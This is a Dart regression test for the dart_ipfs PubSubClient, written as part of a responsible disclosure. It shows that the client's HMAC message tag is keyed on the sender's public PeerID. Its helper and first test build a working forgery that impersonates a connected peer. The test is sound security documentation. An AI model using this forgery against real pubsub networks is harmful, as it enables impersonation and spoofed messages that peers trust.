// Regression/documentation test for the PubSub message-tag forgery issue
// described on PubSubClient's class-level doc comment (SEC-008). Reported
// to the maintainer via responsible disclosure per SECURITY.md before this
// branch was opened.
//
// Demonstrates that PubSubClient's HMAC "signature" can be forged by any
// party using only information every message already discloses in
// cleartext (the sender's own PeerID string), without access to any
// private key or prior secret from the impersonated peer.
//
// This test is expected to start failing once the signing scheme is
// replaced with real asymmetric (Ed25519) signatures verified against a
// known public key for `sender` -- that is the fix working as intended,
// not a regression. See the design notes referenced in the pull request
// description for the suggested approach.

import 'dart:convert';
import 'dart:typed_data';

import 'package:crypto/crypto.dart';
import 'package:dart_ipfs/src/protocols/pubsub/pubsub_client.dart';
import 'package:dart_ipfs/src/transport/router_events.dart';
import 'package:dart_ipfs/src/transport/router_interface.dart';
import 'package:mockito/mockito.dart';
import 'package:test/test.dart';

import 'pubsub_client_coverage_test.mocks.dart';

/// Recomputes PubSubClient's tag exactly as an outside attacker could:
/// using only the sender PeerID string, topic, and content -- all of which
/// are public and carried in cleartext by every message. No access to the
/// victim peer's private key, keystore, or any prior message from them is
/// required.
String _publiclyComputableTag(String sender, String topic, String content) {
  final key = utf8.encode(sender);
  final data = utf8.encode('$topic:$content');
  return Hmac(sha256, key).convert(data).toString();
}

void main() {
  late PubSubClient receiverClient;
  late MockRouterInterface mockRouter;

  // The node under test -- could be anyone's node; its own identity is not
  // what is being impersonated.
  const receiverPeerId = 'QmReceiver9K7mNpQrStUvWxYzABCDEFGH123';
  // A third, unrelated peer whose identity gets impersonated below. Its
  // PeerID is, by design, public (peers must publish it to be dialable).
  const victimPeerId = 'QmVictim9K7mNpQrStUvWxYzABCDEFGH456';

  setUp(() {
    mockRouter = MockRouterInterface();
    receiverClient = PubSubClient(mockRouter, receiverPeerId);
  });

  group('SEC-008: PubSub message tag is forgeable (known limitation)', () {
    test(
      'an unrelated attacker can impersonate a connected victim peer '
      'without knowing any secret',
      () async {
        await receiverClient.start();
        final capturedHandler =
            verify(
                  mockRouter.registerProtocolHandler(any, captureAny),
                ).captured.single
                as void Function(NetworkPacket);

        // The victim is a normal, legitimately connected peer elsewhere in
        // the mesh -- this is the ordinary case, not a special setup.
        when(mockRouter.isConnectedPeer(victimPeerId)).thenReturn(true);

        const topic = 'general-chat';
        const forgedContent =
            'Attacker-controlled message the victim never sent';

        // The "attacker" needs nothing but the victim's public PeerID --
        // which every peer must publish just to be dialable at all -- to
        // produce a tag this client treats as valid.
        final forgedTag = _publiclyComputableTag(
          victimPeerId,
          topic,
          forgedContent,
        );

        final forgedPacket = NetworkPacket(
          // The wire-level source need not even be the victim's own
          // connection: _processIncomingPacket only ever trusts the JSON
          // `sender` field, never packet.srcPeerId, when deciding who a
          // message is "from".
          srcPeerId: 'attacker-own-connection-id',
          datagram: Uint8List.fromList(
            utf8.encode(
              jsonEncode({
                'sender': victimPeerId,
                'topic': topic,
                'content': forgedContent,
                'signature': forgedTag,
              }),
            ),
          ),
        );

        final received = receiverClient.messagesStream.first;
        capturedHandler(forgedPacket);

        final message = await received;
        expect(message.sender, equals(victimPeerId));
        expect(message.content, equals(forgedContent));
      },
    );

    test(
      'the tag depends only on public fields, so an independent party '
      'reproduces the exact same tag without coordinating on a secret',
      () {
        const topic = 'topicA';
        const content = 'hello';

        // What the victim's own, genuine client computes via the public
        // API when it legitimately publishes -- a fresh instance, standing
        // in for the real victim's node, distinct from receiverClient.
        final victimsOwnClient = PubSubClient(
          MockRouterInterface(),
          victimPeerId,
        );
        final legitimateEncoded = victimsOwnClient.encodePublishRequest(
          topic,
          content,
        );
        final legitimateTag =
            (jsonDecode(utf8.decode(legitimateEncoded))
                    as Map<String, dynamic>)['signature']
                as String;

        // What an outside party computes, knowing only the same public
        // fields (sender PeerID, topic, content) -- no secret involved.
        final forgedTag = _publiclyComputableTag(
          victimPeerId,
          topic,
          content,
        );

        expect(
          forgedTag,
          equals(legitimateTag),
          reason:
              'The HMAC key is derived entirely from the public `sender` '
              'field, so anyone can reproduce the exact same tag without '
              'ever holding a secret.',
        );
      },
    );
  });
}
